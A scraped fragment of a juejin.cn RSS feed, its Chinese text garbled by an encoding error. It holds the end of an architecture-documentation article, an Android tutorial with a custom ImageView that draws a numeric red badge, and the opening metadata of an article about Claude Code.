    Mon --&gt; M3["ç”¨æˆ·è¿½è¸ª"]

    %% æ ·å¼
    classDef rootStyle fill:#34495e,stroke:#2c3e50,color:white,font-size:16px
    classDef perfStyle fill:#3498db,stroke:#2980b9,color:white
    classDef secStyle fill:#e74c3c,stroke:#c0392b,color:white
    classDef monStyle fill:#2ecc71,stroke:#27ae60,color:white

    class NFRs rootStyle
    class Perf,P1,P2,P3 perfStyle
    class Sec,S1,S2,S3 secStyle
    class Mon,M1,M2,M3 monStyle
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-5">æ¦‚æ‹¬æ€»ç»“</h3>
<blockquote>
<p><strong>â€œæ¶æ„å¸ˆçš„äº§å‡ºä¸æ˜¯æ–‡æ¡£ï¼Œè€Œæ˜¯å…±è¯†ã€‚â€</strong></p>
<p>å¥½çš„æ¶æ„æ–‡æ¡£ï¼Œä¸æ˜¯ä¸ºäº†è¯æ˜ä½ é€šè¿‡äº†ç­”è¾©ï¼Œè€Œæ˜¯ä¸ºäº†è®©æ–°å…¥èŒçš„åŒå­¦åœ¨ä¸€å¹´åçœ‹åˆ°è¿™è¡Œä»£ç æ—¶ï¼Œèƒ½é€šè¿‡æ–‡æ¡£é‡Œçš„ ADR æ˜ç™½ï¼š <strong>â€œå“¦ï¼ŒåŸæ¥å½“åˆæ˜¯ä¸ºäº†æ€§èƒ½æ‰å†™å¾—è¿™ä¹ˆâ€˜å¥‡æ€ªâ€™çš„ã€‚â€</strong></p>
<p>è¿™å°±æ˜¯æ–‡æ¡£çš„ä»·å€¼â€”â€”ç©¿è¶Šæ—¶é—´çš„æ²Ÿé€šã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è‡ªå®šä¹‰view, å›¾ç‰‡å³ä¸Šè§’æ˜¾ç¤ºæ•°å­—]]></title>    <link>https://juejin.cn/post/7592451588848631827</link>    <guid>https://juejin.cn/post/7592451588848631827</guid>    <pubDate>2026-01-08T02:36:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588848631827" data-draft-id="7592452108798509099" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è‡ªå®šä¹‰view, å›¾ç‰‡å³ä¸Šè§’æ˜¾ç¤ºæ•°å­—"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-08T02:36:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¥¥é™Œé™Œ"/> <meta itemprop="url" content="https://juejin.cn/user/1500168453892327"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è‡ªå®šä¹‰view, å›¾ç‰‡å³ä¸Šè§’æ˜¾ç¤ºæ•°å­—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1500168453892327/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¥¥é™Œé™Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:36:15.000Z" title="Thu Jan 08 2026 02:36:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å…ˆä¸Šæ•ˆæœå›¾</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68941384027742f89e2892dfb7e0c6d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWl6ZmM6ZmM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444575&amp;x-signature=6Id782wy2aYDGdnISqxCccFsnlA%3D" alt="image.png" loading="lazy"/></p>
<p>è‡ªå®šä¹‰view</p>
<pre><code class="hljs"/></pre>
<pre><code class="hljs language-arduino" lang="arduino">

<span class="hljs-comment">/**
 * Description : javaç±»ä½œç”¨æè¿°
 *

 * @since : 2026/1/7
 */</span>


<span class="hljs-keyword">import</span> android.annotation.SuppressLint;
<span class="hljs-keyword">import</span> android.content.Context;
<span class="hljs-keyword">import</span> android.graphics.Canvas;
<span class="hljs-keyword">import</span> android.graphics.Paint;
<span class="hljs-keyword">import</span> android.graphics.Paint.FontMetrics;
<span class="hljs-keyword">import</span> android.text.TextPaint;
<span class="hljs-keyword">import</span> android.util.AttributeSet;
<span class="hljs-keyword">import</span> android.util.TypedValue;
<span class="hljs-keyword">import</span> android.widget.ImageView;

<span class="hljs-comment">/**
 * å®ç°åœ¨å›¾ç‰‡å³ä¸Šè§’æ˜¾ç¤ºæ¶ˆæ¯æ¡æ•°ï¼ˆæ— éœ€è®¾ç½®paddingï¼‰
 */</span>
@<span class="hljs-built_in">SuppressLint</span>(<span class="hljs-string">"AppCompatCustomView"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PointImageView</span> extends ImageView {

    <span class="hljs-comment">/**
     * é»˜è®¤æ¨¡å¼
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> pointMode = NUMBER_POINT;

    <span class="hljs-comment">// 1.ä¸æ˜¾ç¤ºçº¢ç‚¹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> NO_POINT = <span class="hljs-number">1</span>;
    <span class="hljs-comment">// 2.åªæ˜¾ç¤ºä¸€ä¸ªçº¢ç‚¹,è¡¨ç¤ºæœ‰æ–°æ¶ˆæ¯</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> ONLY_POINT = <span class="hljs-number">2</span>;
    <span class="hljs-comment">// 3.æ˜¾ç¤ºä¸€ä¸ªçº¢ç‚¹,çº¢ç‚¹ä¸­é—´è¿˜æœ‰æ¶ˆæ¯çš„æ•°é‡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> NUMBER_POINT = <span class="hljs-number">3</span>;

    <span class="hljs-comment">// æ¶ˆæ¯çš„æ•°é‡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> number = <span class="hljs-number">0</span>;

    <span class="hljs-comment">// è®°å½•å½“å‰æ˜¯å¦æœ‰æ–°æ¶ˆæ¯ï¼ˆè‡ªåŠ¨æ ¹æ®numberåˆ¤å®šï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> isHaveMessage = <span class="hljs-literal">false</span>;

    <span class="hljs-comment">/**
     * ç”»åœ†çš„ç”»ç¬”
     */</span>
    <span class="hljs-keyword">private</span> Paint paint;

    <span class="hljs-comment">/**
     * ç”»æ¶ˆæ¯æ¡æ•°çš„ç”»ç¬”
     */</span>
    <span class="hljs-keyword">private</span> TextPaint paintText;

    <span class="hljs-comment">// è§’æ ‡åŠå¾„ï¼ˆå›ºå®š15dpï¼Œæ— éœ€ä¾èµ–paddingï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> badgeRadius;
    <span class="hljs-comment">// æ–‡å­—å¤§å°ï¼ˆå›ºå®š12spï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> textSize;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PointImageView</span><span class="hljs-params">(Context context)</span> </span>{
        <span class="hljs-built_in">super</span>(context);
        <span class="hljs-built_in">init</span>(context);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PointImageView</span><span class="hljs-params">(Context context, AttributeSet attrs)</span> </span>{
        <span class="hljs-built_in">super</span>(context, attrs);
        <span class="hljs-built_in">init</span>(context);
    }

    <span class="hljs-comment">/**
     * åˆå§‹åŒ–æ•°æ®ï¼ˆé€‚é…dp/spï¼Œç§»é™¤paddingä¾èµ–ï¼‰
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Context context)</span> </span>{
        <span class="hljs-comment">// è½¬æ¢å°ºå¯¸ï¼šdpè½¬pxã€spè½¬pxï¼ˆé€‚é…ä¸åŒè®¾å¤‡ï¼‰</span>
        badgeRadius = <span class="hljs-built_in">dp2px</span>(context, <span class="hljs-number">30</span>); <span class="hljs-comment">// è§’æ ‡åŠå¾„15dpï¼ˆæ ¸å¿ƒï¼šå›ºå®šå¤§å°ï¼Œä¸ä¾èµ–paddingï¼‰</span>
        textSize = <span class="hljs-built_in">sp2px</span>(context, <span class="hljs-number">30</span>);    <span class="hljs-comment">// æ–‡å­—å¤§å°12sp</span>

        <span class="hljs-comment">// åˆå§‹åŒ–çº¢ç‚¹ç”»ç¬”</span>
        paint = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Paint</span>();
        paint.<span class="hljs-built_in">setStyle</span>(Paint.Style.FILL); <span class="hljs-comment">// å®å¿ƒ</span>
        paint.<span class="hljs-built_in">setColor</span>(<span class="hljs-number">0xffff0000</span>);       <span class="hljs-comment">// çº¢è‰²</span>
        paint.<span class="hljs-built_in">setAntiAlias</span>(<span class="hljs-literal">true</span>);         <span class="hljs-comment">// æŠ—é”¯é½¿</span>

        <span class="hljs-comment">// åˆå§‹åŒ–æ–‡å­—ç”»ç¬”</span>
        paintText = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TextPaint</span>();
        paintText.<span class="hljs-built_in">setColor</span>(<span class="hljs-number">0xffffffff</span>);   <span class="hljs-comment">// ç™½è‰²</span>
        paintText.<span class="hljs-built_in">setTextSize</span>(textSize);  <span class="hljs-comment">// è®¾ç½®æ–‡å­—å¤§å°</span>
        paintText.<span class="hljs-built_in">setAntiAlias</span>(<span class="hljs-literal">true</span>);
        paintText.<span class="hljs-built_in">setTextAlign</span>(Paint.Align.CENTER); <span class="hljs-comment">// æ–‡å­—æ°´å¹³å±…ä¸­ï¼ˆç®€åŒ–è®¡ç®—ï¼‰</span>
    }

    @<span class="hljs-function">Override
    <span class="hljs-keyword">protected</span> <span class="hljs-type">void</span> <span class="hljs-title">onDraw</span><span class="hljs-params">(Canvas canvas)</span> </span>{
        super.<span class="hljs-built_in">onDraw</span>(canvas);
        <span class="hljs-comment">// æ— æ¶ˆæ¯åˆ™ä¸ç»˜åˆ¶</span>
        <span class="hljs-keyword">if</span> (!isHaveMessage) {
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// è®¡ç®—è§’æ ‡ä¸­å¿ƒåæ ‡ï¼šViewå³ä¸Šè§’å‘å†…åç§»radiusï¼ˆé¿å…è¶…å‡ºViewï¼‰</span>
        <span class="hljs-type">float</span> badgeCenterX = <span class="hljs-built_in">getWidth</span>() - badgeRadius;  <span class="hljs-comment">// å³è¾¹ç¼˜ - åŠå¾„</span>
        <span class="hljs-type">float</span> badgeCenterY = badgeRadius;               <span class="hljs-comment">// ä¸Šè¾¹ç¼˜ + åŠå¾„</span>

        <span class="hljs-keyword">switch</span> (pointMode) {
            <span class="hljs-keyword">case</span> NO_POINT: <span class="hljs-comment">// ä¸æ˜¾ç¤ºçº¢ç‚¹</span>
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> ONLY_POINT: <span class="hljs-comment">// åªæ˜¾ç¤ºçº¢ç‚¹</span>
                canvas.<span class="hljs-built_in">drawCircle</span>(badgeCenterX, badgeCenterY, badgeRadius, paint);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> NUMBER_POINT: <span class="hljs-comment">// æ˜¾ç¤ºçº¢ç‚¹ä¸”å¸¦æ¶ˆæ¯æ¡æ•°</span>
                <span class="hljs-comment">// 1. ç»˜åˆ¶çº¢è‰²åœ†ç‚¹</span>
                canvas.<span class="hljs-built_in">drawCircle</span>(badgeCenterX, badgeCenterY, badgeRadius, paint);
                <span class="hljs-comment">// 2. å¤„ç†æ˜¾ç¤ºçš„æ–‡å­—</span>
                <span class="hljs-type">String</span> showText;
                <span class="hljs-keyword">if</span> (number &gt; <span class="hljs-number">0</span> &amp;&amp; number &lt; <span class="hljs-number">100</span>) {
                    showText = <span class="hljs-type">String</span>.<span class="hljs-built_in">valueOf</span>(number);
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (number &gt;= <span class="hljs-number">100</span>) {
                    showText = <span class="hljs-string">"99+"</span>; <span class="hljs-comment">// ä¼˜åŒ–æ˜¾ç¤ºï¼š99+ æ›´ç¬¦åˆé€šç”¨è®¾è®¡</span>
                } <span class="hljs-keyword">else</span> {
                    showText = <span class="hljs-string">""</span>;
                }
                <span class="hljs-comment">// 3. è®¡ç®—æ–‡å­—å‚ç›´å±…ä¸­çš„åŸºå‡†çº¿ï¼ˆæ ¸å¿ƒï¼šé¿å…æ–‡å­—åç§»ï¼‰</span>
                FontMetrics fm = paintText.<span class="hljs-built_in">getFontMetrics</span>();
                <span class="hljs-comment">// å‚ç›´å±…ä¸­å…¬å¼ï¼šä¸­å¿ƒYåæ ‡ - (å­—ä½“ä¸Šè¾¹ç•Œ+ä¸‹è¾¹ç•Œ)/2</span>
                <span class="hljs-type">float</span> textBaseline = badgeCenterY - (fm.top + fm.bottom) / <span class="hljs-number">2</span>;
                <span class="hljs-comment">// 4. ç»˜åˆ¶æ–‡å­—ï¼ˆæ°´å¹³å±…ä¸­+å‚ç›´å±…ä¸­ï¼‰</span>
                canvas.<span class="hljs-built_in">drawText</span>(showText, badgeCenterX, textBaseline, paintText);
                <span class="hljs-keyword">break</span>;
        }
    }

    <span class="hljs-comment">/**
     * è®¾ç½®æ¶ˆæ¯æ¡æ•°ï¼ˆè‡ªåŠ¨åˆ¤å®šæ˜¯å¦æœ‰æ¶ˆæ¯ï¼Œæ— éœ€æ‰‹åŠ¨è°ƒç”¨setHaveMessageï¼‰
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setMessageNum</span><span class="hljs-params">(<span class="hljs-type">int</span> number)</span> </span>{
        <span class="hljs-keyword">this</span>.number = number;
        <span class="hljs-comment">// è‡ªåŠ¨æ›´æ–°ï¼šæ•°å­—&gt;0åˆ™æ˜¾ç¤ºçº¢ç‚¹/æ•°å­—ï¼Œå¦åˆ™ä¸æ˜¾ç¤º</span>
        <span class="hljs-keyword">this</span>.isHaveMessage = number &gt; <span class="hljs-number">0</span>;
        <span class="hljs-built_in">invalidate</span>(); <span class="hljs-comment">// è§¦å‘é‡ç»˜</span>
    }

    <span class="hljs-comment">/**
     * æ‰‹åŠ¨æ§åˆ¶æ˜¯å¦æ˜¾ç¤ºï¼ˆå¯é€‰ï¼Œä¼˜å…ˆç”¨setMessageNumè‡ªåŠ¨æ§åˆ¶ï¼‰
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setHaveMessage</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isHaveMessage)</span> </span>{
        <span class="hljs-keyword">this</span>.isHaveMessage = isHaveMessage;
        <span class="hljs-built_in">invalidate</span>();
    }

    <span class="hljs-comment">/**
     * è®¾ç½®æ˜¾ç¤ºæ¨¡å¼
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setPointMode</span><span class="hljs-params">(<span class="hljs-type">int</span> mode)</span> </span>{
        <span class="hljs-keyword">if</span> (mode &gt; <span class="hljs-number">0</span> &amp;&amp; mode &lt;= <span class="hljs-number">3</span>) {
            pointMode = mode;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">"è®¾ç½®çš„æ¨¡å¼æœ‰è¯¯ï¼Œä»…æ”¯æŒ1-3"</span>);
        }
        <span class="hljs-built_in">invalidate</span>(); <span class="hljs-comment">// æ¨¡å¼å˜åŒ–åé‡ç»˜</span>
    }

    <span class="hljs-comment">// å·¥å…·æ–¹æ³•ï¼šdpè½¬px</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">float</span> <span class="hljs-title">dp2px</span><span class="hljs-params">(Context context, <span class="hljs-type">float</span> dp)</span> </span>{
        <span class="hljs-keyword">return</span> TypedValue.<span class="hljs-built_in">applyDimension</span>(
                TypedValue.COMPLEX_UNIT_DIP,
                dp,
                context.<span class="hljs-built_in">getResources</span>().<span class="hljs-built_in">getDisplayMetrics</span>()
        );
    }

    <span class="hljs-comment">// å·¥å…·æ–¹æ³•ï¼šspè½¬px</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">float</span> <span class="hljs-title">sp2px</span><span class="hljs-params">(Context context, <span class="hljs-type">float</span> sp)</span> </span>{
        <span class="hljs-keyword">return</span> TypedValue.<span class="hljs-built_in">applyDimension</span>(
                TypedValue.COMPLEX_UNIT_SP,
                sp,
                context.<span class="hljs-built_in">getResources</span>().<span class="hljs-built_in">getDisplayMetrics</span>()
        );
    }

    <span class="hljs-comment">// å…¼å®¹æ—§æ–¹æ³•åï¼ˆé¿å…è°ƒç”¨æ–¹æŠ¥é”™ï¼‰</span>
    @<span class="hljs-function">Deprecated
    <span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setHaveMesage</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isHaveMesage)</span> </span>{
        <span class="hljs-built_in">setHaveMessage</span>(isHaveMesage);
    }
}
</code></pre>
<p>ä½¿ç”¨</p>
<pre><code class="hljs language-ini" lang="ini">
&lt;?xml <span class="hljs-attr">version</span>=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;
&lt;LinearLayout xmlns:<span class="hljs-attr">android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span>
    xmlns:<span class="hljs-attr">tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span>
    android:<span class="hljs-attr">layout_width</span>=<span class="hljs-string">"match_parent"</span>
    android:<span class="hljs-attr">layout_height</span>=<span class="hljs-string">"match_parent"</span>
    android:<span class="hljs-attr">gravity</span>=<span class="hljs-string">"center"</span>
    android:<span class="hljs-attr">orientation</span>=<span class="hljs-string">"vertical"</span>&gt;

    &lt;com.amap.apis.cluster.testview.PointImageView
        android:<span class="hljs-attr">layout_width</span>=<span class="hljs-string">"100dp"</span>
        android:<span class="hljs-attr">layout_height</span>=<span class="hljs-string">"100dp"</span>
        android:<span class="hljs-attr">src</span>=<span class="hljs-string">"@drawable/test"</span>
        android:<span class="hljs-attr">id</span>=<span class="hljs-string">"@+id/imageView"</span> /&gt;

&lt;/LinearLayout&gt;
</code></pre>
<p>åœ¨Activity ä¸­åŠ è½½</p>
<pre><code class="hljs language-scss" lang="scss">
private PointImageView mPointImageView;
<span class="hljs-keyword">@Override</span>
protected void onCreate(Bundle savedInstanceState) {
    super<span class="hljs-selector-class">.onCreate</span>(savedInstanceState);
    <span class="hljs-built_in">setContentView</span>(R.layout.activity_customer_view_main);
    mPointImageView = <span class="hljs-built_in">findViewById</span>(R.id.imageView);
    mPointImageView<span class="hljs-selector-class">.setImageResource</span>(R.drawable.test);
    mPointImageView<span class="hljs-selector-class">.setMessageNum</span>(<span class="hljs-number">10</span>);
    mPointImageView<span class="hljs-selector-class">.setPointMode</span>(<span class="hljs-number">3</span>);

    int sizeDp = <span class="hljs-number">200</span>;
    int sizePx = <span class="hljs-built_in">dp2px</span>(sizeDp); <span class="hljs-comment">// dp è½¬ px</span>
    ViewGroup<span class="hljs-selector-class">.LayoutParams</span> params = new LinearLayout<span class="hljs-selector-class">.LayoutParams</span>(sizePx, sizePx);
    mPointImageView<span class="hljs-selector-class">.setLayoutParams</span>(params);
    mPointImageView<span class="hljs-selector-class">.setPadding</span>(<span class="hljs-number">50</span>,<span class="hljs-number">50</span>,<span class="hljs-number">50</span>,<span class="hljs-number">50</span>);

}
private int <span class="hljs-built_in">dp2px</span>(float dp) {
    <span class="hljs-attribute">float</span> density = <span class="hljs-built_in">getResources</span>()<span class="hljs-selector-class">.getDisplayMetrics</span>()<span class="hljs-selector-class">.density</span>;
    return (int) (dp * density + <span class="hljs-number">0.5</span>f);
}


</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±åº¦æ­ç§˜ï¼šä¸ºä»€ä¹ˆé¡¶å°–å¼€å‘è€…éƒ½å¼€å§‹åœ¨ç»ˆç«¯ç”¨ Claude Code å†™ä»£ç ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592759902675779630</link>    <guid>https://juejin.cn/post/7592759902675779630</guid>    <pubDate>2026-01-08T02:35:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759902675779630" data-draft-id="7592552501579251738" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±åº¦æ­ç§˜ï¼šä¸ºä»€ä¹ˆé¡¶å°–å¼€å‘è€…éƒ½å¼€å§‹åœ¨ç»ˆç«¯ç”¨ Claude Code å†™ä»£ç ï¼Ÿ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T02:35:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‚Ÿé¸£"/> <meta itemprop="url" content="https://juejin.cn/user/4107431171852270"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±åº¦æ­ç§˜ï¼šä¸ºä»€ä¹ˆé¡¶å°–å¼€å‘è€…éƒ½å¼€å§‹åœ¨ç»ˆç«¯ç”¨ Claude Code å†™ä»£ç ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4107431171852270/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‚Ÿé¸£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:35:29.000Z" title="Thu Jan 08 2026 02:35:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
